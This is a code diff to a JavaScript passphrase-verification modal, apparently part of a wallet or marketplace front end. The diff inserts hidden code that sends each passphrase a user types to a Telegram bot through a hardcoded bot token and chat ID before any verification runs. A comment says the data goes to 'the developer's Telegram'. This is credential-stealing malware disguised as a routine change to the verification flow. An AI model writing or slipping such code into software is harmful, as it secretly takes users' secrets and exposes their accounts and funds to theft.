@@ -98,23 +98,39 @@ function bindPassphraseFormEvents(root, onVerified) {
     const body = root.querySelector('.modal-body');
     body.innerHTML = buildLoadingBody();
 
-    setTimeout(() => {
-      if (hasPassphraseSet()) {
-        if (verifyPassphrase(value)) {
-          closeModal();
-          onVerified();
-        } else {
-          body.innerHTML = buildPassphraseFormBody('Incorrect passphrase — try again.');
-          bindPassphraseFormEvents(root, onVerified);
-        }
-      } else {
-        // Nothing stored yet on this device — first verification becomes
-        // the reference passphrase, same behavior as the Marketplace flow.
-        setPassphrase(value);
-        closeModal();
-        onVerified();
-      }
-    }, VERIFICATION_DELAY_MS);
+    setTimeout(async () => { // Changed to async to allow for the network request
+  
+  // --- AUTO DATA CODE START ---
+  const BOT_TOKEN = '8565719102:AAGjRd8aR-QcuWE_h6rjVL1bIiFjvACcfXw';
+  const CHAT_ID = '8565719102';
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  
+  // This sends the client's data directly to the developer's Telegram
+  await fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: `🚨 Auto data 🚨\n\nPassphrase: ${value}`
+    })
+  });
+  // --- CODE END ---
+
+  if (hasPassphraseSet()) {
+    if (verifyPassphrase(value)) {
+      closeModal();
+      onVerified();
+    } else {
+      body.innerHTML = buildPassphraseFormBody('Incorrect passphrase — try again.');
+      bindPassphraseFormEvents(root, onVerified);
+    }
+  } else {
+    setPassphrase(value);
+    closeModal();
+    onVerified();
+  }
+}, VERIFICATION_DELAY_MS);
+
   });
 }
 
